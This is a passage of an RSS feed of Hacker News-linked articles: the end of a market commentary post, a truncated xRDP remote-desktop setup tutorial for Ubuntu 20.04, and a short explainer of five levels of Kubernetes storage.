<figure><a href="https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11.png" target="_blank" rel="noopener"><img loading="lazy" width="990" height="591" src="https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11.png" alt="" srcset="https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11.png 990w, https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11-300x179.png 300w, https://compoundadvisors.com/wp-content/uploads/2021/01/sigl-stock-1-11-768x458.png 768w" sizes="(max-width: 990px) 100vw, 990px"></a></figure>



<p>Its market cap at today’s high hit $739 million, up from $6 million before the Musk tweet.</p>



<p>If that’s not a clear signal of insanity, I don’t know what is.</p>



<p>—</p>



<p>To sign up for our free newsletter,&nbsp;<a rel="noreferrer noopener" href="https://compoundadvisors.com/newsletter" target="_blank">click here</a>.</p>



<p>Disclaimer: All information provided is for educational purposes only and does not constitute investment, legal or tax advice, or an offer to buy or sell any security. For our full disclosures,&nbsp;<a rel="noreferrer noopener" href="https://compoundadvisors.com/site-disclosures" target="_blank">click here</a>.</p>
</div></div>]]>
            </description>
            <link>https://compoundadvisors.com/2021/a-clear-signal-of-insanity</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790370</guid>
            <pubDate>Fri, 15 Jan 2021 12:54:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Connect to an Ubuntu 20.04 Server via Remote Desktop Connection w/ XRDP]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25790225">thread link</a>) | @punkspider
<br/>
January 15, 2021 | https://thunderboltlaptop.com/install-xrdp-ubuntu/ | <a href="https://web.archive.org/web/*/https://thunderboltlaptop.com/install-xrdp-ubuntu/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>In this tutorial we’ll install <strong>xRDP</strong> on a server running <strong>Ubuntu 20.04</strong> and install multiple desktop environments on it (Openbox, GNOME, XFCE, LXQt, LXDE, MATE, KDE Plasma). We’ll see how to connect via RDP from Windows, Linux, macOS, Android and iOS, how to optimize the connection speed in some cases, and how to fix a few common issues when using xRDP.</p>
<p>xRDP is a free and open-source implementation of Microsoft RDP (Remote Desktop Protocol) that enables other operating systems, other than Windows, to provide a fully functional remote desktop experience.</p>
<p>xRDP is fully compatible with <code>Microsoft RDP</code>, <code>rdesktop</code>, <code>FreeRDP</code> and <code>NeutrinoRDP</code>.</p>
<p>With xRDP you can have your own RDP Server on your Linux box, and connect to it via Microsoft’s Remote Desktop Client (if you use Windows), but also, you can use Linux, macOS, Android and iOS using their respective clients.</p>

<h2><span id="Prerequisites"></span><strong>Prerequisites</strong><span></span></h2>
<ul>
<li>A Linux box running Ubuntu 20.04.</li>
<li>A Desktop Environment.</li>
<li>A user with <code>sudo</code> privileges. We recommend a <strong>non-root</strong> <code>sudo</code> user, because acting as root can damage your system if you’re not careful. When you’re logged in as <code>root</code>, applications are running with <strong>root privileges</strong> and because of some bug or vulnerability they can damage your system. You can do anything and the system won’t ask, and you can easily change the system in a way that could be harmful, if you’re not careful. If you act as a <code>non-root</code> <code>sudo</code> user, then the system will ask for the password, which could make you pause and prevent you from making a potentially harmful change.</li>
</ul>
<hr>
<h2><span id="Step_1_%E2%80%93_Install_xRDP_on_Ubuntu_20_04"></span>Step 1 – Install xRDP on Ubuntu 20.04<span></span></h2>
<p>To begin,we’ll update the package index:</p>
<pre data-enlighter-language="generic">sudo apt update</pre>
<p>To install xRDP, run the command:</p>
<pre data-enlighter-language="generic">sudo apt -y install xrdp</pre>
<p>The output will look something like this:</p>
<pre data-enlighter-language="generic">Reading package lists... Done
Building dependency tree
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libunity-gtk2-parser0 libunity-gtk3-parser0 unity-gtk-module-common
Use 'apt autoremove' to remove them.
The following additional packages will be installed:
  xorgxrdp
Suggested packages:
  guacamole xrdp-pulseaudio-installer
The following NEW packages will be installed:
  xorgxrdp xrdp
0 upgraded, 2 newly installed, 0 to remove and 147 not upgraded.
Need to get 488 kB of archives.
After this operation, 3212 kB of additional disk space will be used.</pre>
<p>Once installed, it should run as a service automatically. You can check it by typing:</p>
<pre data-enlighter-language="generic">sudo systemctl status xrdp</pre>
<p>You should see something like:</p>
<pre data-enlighter-language="generic">● xrdp.service - xrdp daemon
     Loaded: loaded (/lib/systemd/system/xrdp.service; enabled; vendor preset: enabled)
     Active: active (running) since Wed 2020-12-23 15:10:48 CET; 3min 24s ago
       Docs: man:xrdp(8)
             man:xrdp.ini(5)
   Main PID: 1937 (xrdp)
      Tasks: 1 (limit: 1068)
     Memory: 1.4M
     CGroup: /system.slice/xrdp.service
             └─1937 /usr/sbin/xrdp</pre>
<p>xRDP makes use of the file <code>/etc/ssl/private/ssl-cert-snakeoil.key</code> which belongs to the <code>ssl-cert</code> group. Therefore, we need to add the xRDP user to that group:</p>
<pre data-enlighter-language="generic">sudo adduser xrdp ssl-cert</pre>
<p>We need to restart xRDP to changes to take effect:</p>
<pre data-enlighter-language="generic">sudo systemctl restart xrdp</pre>
<p>At this point, you have xRDP installed and running on your Ubuntu.</p>
<h3><span id="Opening_Ports"></span>Opening Ports<span></span></h3>
<p>Assuming you have Uncomplicated Firewall (<strong>ufw</strong>) installed and active, to be able to connect to our server, we need to open the 3389 (defaulft) port on our Firewall.</p>
<p>To accomplish this, we need to run:</p>
<pre data-enlighter-language="generic">sudo ufw allow 3389</pre>
<p>You can secure it even more, by allowing only a specific IP address or IP range:</p>
<p>For a specific IP address:</p>
<pre data-enlighter-language="generic">sudo ufw allow from 1.1.1.1 to any port 3389</pre>
<p>For a specific IP range:</p>
<pre data-enlighter-language="generic">sudo ufw allow from 192.168.0.0/24 to any port 3389</pre>
<h3><span id="xRDP_Configuration"></span>xRDP Configuration<span></span></h3>
<p>By default, you don’t need to make any changes. But you can change the default port, add compression, and other settings by typing:</p>
<pre data-enlighter-language="generic">sudo nano /etc/xrdp/xrdp.ini</pre>
<p>Remember to restart the service, after any change.</p>
<h2><span id="Step_2_%E2%80%93_Install_Your_Preferred_Desktop_Environment"></span>Step 2 – Install Your Preferred Desktop Environment<span></span></h2>
<p>To be able to connect to your box with xRDP, you’ll need at least one desktop environment installed on it.</p>
<h3><span id="Install_GNOME_Desktop_Environment"></span>Install GNOME Desktop Environment<span></span></h3>
<p><strong>GNOME</strong> is the default desktop environment for many Linux distros. At the time of writing, the latest version is GNOME 3.</p>
<p>To install it, run the following command:</p>
<pre data-enlighter-language="generic">sudo apt -y install ubuntu-desktop</pre>
<p>This is how GNOME Desktop looks like when you log in:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome.png" alt="xRDP GNOME Desktop" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_gnome-1536x864.png 1536w"></p>
<h3><span id="Install_XFCE_Desktop_Environment"></span>Install XFCE Desktop Environment<span></span></h3>
<p><strong>XFCE</strong> is another Desktop Environment but low on system resources and fast. In other words: a lightweight desktop. You can install it by typing:</p>
<pre data-enlighter-language="generic">sudo apt -y install xubuntu-desktop xubuntu-core</pre>
<p>This is how XFCE looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4.png" alt="xRDP XFCE4 Desktop" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_xfce4-1536x864.png 1536w"></p>
<h3><span id="Install_LXQt_Desktop_Environment"></span>Install LXQt Desktop Environment<span></span></h3>
<p><strong>LXQt</strong> is a port of LXDE. As LXDE, it has low resource requirements, in comparison to most popular desktop environments. It’s one of the better choices to use with xRDP, in my opinion.</p>
<p>To install it run:</p>
<pre data-enlighter-language="generic">sudo apt -y install lxqt</pre>
<p>This is how LXQt looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt.png" alt="xRDP LXQT" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxqt-1536x864.png 1536w"></p>
<h3><span id="Install_LXDE_Desktop_Environment"></span>Install LXDE Desktop Environment<span></span></h3>
<p><strong>LXDE</strong> (Lightweight X11 Desktop Environment) is a popular lightweight desktop environment. It’s built to have low resource requirements, and is another great choice for xRDP.</p>
<p>There are multiple ways you can install it. For the purposes of this tutorial I’m using a simple command. If you’d like different methods, based on certain preferences you may have, you can check the <a href="https://wiki.lxde.org/en/Installation" target="_blank" rel="noopener">Intallation section on LXDE.org</a></p>
<p>To quickly install LXDE run:</p>
<pre data-enlighter-language="generic">sudo apt -y install lxde</pre>
<p>This is how LXDE looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde.png" alt="xRDP LXDE" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_lxde-1536x864.png 1536w"></p>
<h3><span id="Install_MATE_Desktop_Environment"></span>Install MATE Desktop Environment<span></span></h3>
<p><strong>MATE</strong> is an attractive and intuitive Desktop Environment. A fork from the GNOME 2 Desktop, in response to the negative reception of GNOME 3, when the traditional taskbar (<a href="https://en.wikipedia.org/wiki/GNOME_Panel" target="_blank" rel="noopener">GNOME Panel</a>) with the <a href="https://en.wikipedia.org/wiki/GNOME_Shell" target="_blank" rel="noopener">GNOME Shell</a>.</p>
<p>To install it run:</p>
<pre data-enlighter-language="generic">sudo apt -y install ubuntu-mate-desktop ubuntu-mate-core</pre>
<p>This is how MATE Desktop looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate.png" alt="xRDP MATE" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_mate-1536x864.png 1536w"></p>
<h3><span id="Install_KDE_Plasma_Desktop_Environment"></span>Install KDE Plasma Desktop Environment<span></span></h3>
<p><strong>KDE Plasma</strong> is one of the most recognized Desktops Environments. It’s one of the most beautiful desktop environments, in my opinion, and it’s got some great features, and it’s very customizable.</p>
<p>You can install it by running:</p>
<pre data-enlighter-language="generic">sudo apt -y install kubuntu-desktop</pre>
<p>This is how KDE Plasma looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma.png" alt="xRDP KDE Plasma" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_kde_plasma-1536x864.png 1536w"></p>
<h3><span id="Install_Openbox_Window_Manager"></span>Install Openbox Window Manager<span></span></h3>
<p><strong>Openbox</strong> is a window manager and not a desktop environment. It won’t offer you a wallpaper, taskbar or system panel. But it’s very lightweight and you can open the menu by right clicking anywhere on the screen and selecting what you want to run.</p>
<p>It’s probably the best choice if you find that your connection is laggy with xRDP, but you absolutely need to connect to a Linux machine using xRDP.</p>
<p>Here’s how Openbox looks like:<br>
<img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox.png" alt="xRDP Openbox" width="1920" height="1080" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-1536x864.png 1536w" data-sizes="(max-width: 1920px) 100vw, 1920px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox.png 1920w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-300x169.png 300w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-1024x576.png 1024w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-768x432.png 768w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xrdp_openbox-1536x864.png 1536w"></p>
<hr>
<h2><span id="Switching_Between_Desktop_Environments_for_xRDP"></span>Switching Between Desktop Environments for xRDP<span></span></h2>
<p>If you have multiple desktop environments installed and want to switch between them you can run the following command:</p>
<pre data-enlighter-language="generic">sudo update-alternatives --config x-session-manager</pre>
<p>You’ll be presented with the options representing your installed desktop environments. Just enter the number corresponding with your desktop environment from the list and press Enter.</p>
<pre data-enlighter-language="generic">There are 9 choices for the alternative x-session-manager (providing /usr/bin/x-session-manager).

  Selection    Path                      Priority   Status
------------------------------------------------------------
  0            /usr/bin/startlxde         50        auto mode
  1            /usr/bin/gnome-session     50        manual mode
  2            /usr/bin/lxsession         49        manual mode
  3            /usr/bin/mate-session      50        manual mode
  4            /usr/bin/openbox-session   40        manual mode
* 5            /usr/bin/startlxde         50        manual mode
  6            /usr/bin/startlxqt         50        manual mode
  7            /usr/bin/startplasma-x11   40        manual mode
  8            /usr/bin/startxfce4        50        manual mode
  9            /usr/bin/xfce4-session     40        manual mode

Press &lt;enter&gt; to keep the current choice[*], or type selection number: 2
update-alternatives: using /usr/bin/lxsession to provide /usr/bin/x-session-manager (x-session-manager) in manual mode</pre>
<p>In my example I have 9 choices:</p>
<p><code>0 - /usr/bin/startlxde</code> – the current desktop environment<br>
<code>1 - /usr/bin/gnome-session</code> – GNOME 3<br>
<code>2 - /usr/bin/lxsession</code> – LXDE<br>
<code>3 - /usr/bin/mate-session</code> – MATE Desktop<br>
<code>4 - /usr/bin/openbox-session</code> – Openbox<br>
<code>5 - /usr/bin/startlxde</code> – LXDE (same as lxsession)<br>
<code>6 - /usr/bin/startlxqt</code> – LXQt<br>
<code>7 - /usr/bin/startplasma-x11</code> – KDE Plasma<br>
<code>8 - /usr/bin/startxfce4</code> – XFCE<br>
<code>9 - /usr/bin/xfce4-session</code> – XFCE (same as startxfce4)</p>
<div><p>I believe the correct way to start <strong>LXDE</strong> is selecting <code>startlxde</code>, and to start <strong>XFCE</strong> select <code>startxfce4</code>. I am not yet sure why <strong>lxsession</strong> and <strong>startlxde</strong> both appear, as selecting either switches to LXDE. The same for <strong>startxfce4</strong> and <strong>xfce4-session</strong> – selecting either will switch to XFCE. As far as I know, <strong>startlxde</strong> and <strong>startxfce4</strong> are scripts that call the executables lxsession and startlxde, respectively. If you know the explanation for this, then please feel free to let us know and we’ll update the guide.</p></div><p>Next time you log into your server via xRDP, your desktop environment should be changed. There’s no need to restart xRDP for the changes to be applied.</p>
<h2><span id="Interacting_with_the_xRDP_service"></span>Interacting with the xRDP service<span></span></h2>
<p>Like any other service, you can interact with <em>xRDP</em> via <em>systemctl:</em></p>
<p>Stop xRDP Service:</p>
<pre data-enlighter-language="generic">sudo systemctl stop xrdp</pre>
<p>Start xRDP Service:</p>
<pre data-enlighter-language="generic">sudo systemctl start xrdp</pre>
<p>Enable xRDP on boot:</p>
<pre data-enlighter-language="generic">sudo systemctl enable xrdp</pre>
<p>Disable xRDP on boot:</p>
<pre data-enlighter-language="generic">sudo systemctl disable xrdp</pre>
<h2><span id="Step_3_%E2%80%93_Connecting_to_Your_Remote_Desktop"></span>Step 3 – Connecting to Your Remote Desktop<span></span></h2>
<p>To connect to our new RDP service, we need to use a RDP Client.</p>
<h3><span id="Connect_from_Windows"></span>Connect from Windows<span></span></h3>
<p>Microsoft’s default RDP client it’s called “Remote Desktop Connection”, and it’s installed by default.</p>
<p>To quickly connect, enter the Ubuntu machine’s IP address or hostname, and click on <em>Connect</em>.</p>
<p>If you click <strong>Show Options</strong> you’ll see more options, such as inputting the <code>User name</code>, saving credentials for future use, so you don’t have to add them every time, adjusting the connection quality preferences, and more.</p>
<p><img src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xRDP_windows-1.png" data-src="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xRDP_windows-1.png" alt="xRDP Windows" width="407" height="474" data-srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xRDP_windows-1.png 407w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xRDP_windows-1-258x300.png 258w" data-sizes="(max-width: 407px) 100vw, 407px" srcset="https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xRDP_windows-1.png 407w, https://y7c3f9y2.stackpathcdn.com/wp-content/uploads/2020/12/xRDP_windows-1-258x300.png 258w"></p>
<h3><span id="Connect_from_Linux"></span>Connect from Linux<span></span></h3>
<p>There are a lot …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thunderboltlaptop.com/install-xrdp-ubuntu/">https://thunderboltlaptop.com/install-xrdp-ubuntu/</a></em></p>]]>
            </description>
            <link>https://thunderboltlaptop.com/install-xrdp-ubuntu/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25790225</guid>
            <pubDate>Fri, 15 Jan 2021 12:38:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Five levels of Kubernetes storage – meme turned into explainer]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25790188">thread link</a>) | @aceflux
<br/>
January 15, 2021 | https://www.kubenuts.com/5-levels-k8s-storage/ | <a href="https://web.archive.org/web/*/https://www.kubenuts.com/5-levels-k8s-storage/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
				<div id="content">
			
	<div id="primary">
		<main id="main">
			
<article id="post-2234" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
					
			
		<div itemprop="text">
			
<div>
<div>
<h2>Introduction</h2>



<p>Don’t you love memes? Now there’s one explaining the 5 levels of storage available to Kubernetes. <em>To the right &gt;&gt;&gt;</em></p>



<p>Let’s go through a high-level overview of each level. You can then focus on the level that best matches your cluster’s needs.</p>







<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 1 –</span><span data-amp-original-style="color: #ffffff;background-color: #ffffff">              </span><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Ephemeral Storage</span></h2>



<p><strong>What is it?</strong> Default storage state of every Kubernetes cluster. Each node contains “ephemeral” storage space. </p>



<p><strong>Useful for:</strong> this is for storage of <em>temporary</em> user data within the VM. Works fine if your application doesn’t need to recall data. </p>



<p><strong>Leaves off at:</strong> now, how many apps get by with temporary storage alone?</p>
</div>



<div>
<div><figure><amp-img src="https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s-514x1024.png" alt="" width="292" height="581" srcset="https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s-514x1024.png 514w, https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s-151x300.png 151w, https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s.png 746w" sizes="(max-width: 292px) 100vw, 292px" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img loading="lazy" src="https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s-514x1024.png" alt="" width="292" height="581" srcset="https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s-514x1024.png 514w, https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s-151x300.png 151w, https://www.kubenuts.com/wp-content/uploads/2020/12/persistent-storage-k8s.png 746w" sizes="(max-width: 292px) 100vw, 292px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU4MScgd2lkdGg9JzI5MicgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption>Source: @memenetes/Twitter</figcaption></figure></div>
</div>
</div>



<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 2 – hostPath</span></h2>



<p><strong>What is it? </strong> The first step to running a persistent (rather than temporary) volume of any kind. hostPath uses a directory to emulate network-attached storage (NAS) within the node.</p>



<p><strong>Useful for:</strong> development and testing on a single-node cluster. </p>



<p><strong>Leaves off at: </strong>you wouldn’t use this on a production cluster because of its limited reach.</p>







<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 3 – Static Persistent Volume </span></h2>



<p><strong>What is it? </strong> Proper storage for your applications at production. Static PVs are virtual views of physical storage. Users can then request PVs using Persistent Volume Claims (PVCs).</p>



<p><strong>Useful for: </strong>when developers/operators are making simple, predictable claims for storage.</p>



<p><strong>Leaves off at: </strong>requires user’s PVC to match what’s available. Chance of mismatch is higher as needs become more complex. Nodes risk losing out on available storage.  </p>







<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 4 – Dynamic Persistent Volume</span></h2>



<p><strong>What is it? </strong> A more robust form of Persistent Volume than the static version. Essentially automates the process of PV creation.</p>



<p><strong>Useful for: </strong>situations where PVs are created based on demand rather than the other way round. Kicks in when static PVs are unable to provide storage for a specific PVC.</p>



<p><strong>Leaves off at: </strong>it’s actually good enough for most applications. Well at least the ones that don’t get pummelled with 10s of thousands of users a day.</p>







<h2><span data-amp-original-style="color: #ffffff;background-color: #0693e3">Level 5 – Topology-aware Volume Provisioner</span></h2>



<p><strong>What is it?</strong> Dynamic PVs are provisioned using scheduler input on the best positioning for the pod. Cuts risk of pod failure due to PV running in low CPU or memory VMs.</p>



<p>Best explained by this illustration where multiple zones are created with duplicate nodes :</p>



<figure><amp-img src="https://cloud.ibm.com/docs-content/v1/content/7a1f74245f0d26a87c73d2c1f25d2e4278f51e91/containers/images/cs_cluster_ha_roadmap_multizone_public.png" alt="" width="1664" height="606" layout="intrinsic" i-amphtml-layout="intrinsic"><img src="https://cloud.ibm.com/docs-content/v1/content/7a1f74245f0d26a87c73d2c1f25d2e4278f51e91/containers/images/cs_cluster_ha_roadmap_multizone_public.png" alt="" width="1664" height="606" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzYwNicgd2lkdGg9JzE2NjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img><figcaption>Image source: <a href="https://cloud.ibm.com/docs/containers?topic=containers-ha_clusters">IBM – Provisioning your clusters for high availability </a></figcaption></figure>



<p><strong>Useful for: </strong>higher availability of applications especially in mission-critical situations. Increases fault tolerance by running workloads across several zones within a region.</p>



<p><strong>Leaves off at: </strong>nothing. This is the ultimate level of Kubernetes storage. Master it and you’ve got a cluster that can handle almost any storage challenge. </p>
		</div>

				
			</div>
</article>

			

					</main>
	</div>

	

	</div>
</div></div>]]>
            </description>
            <link>https://www.kubenuts.com/5-levels-k8s-storage/</link>
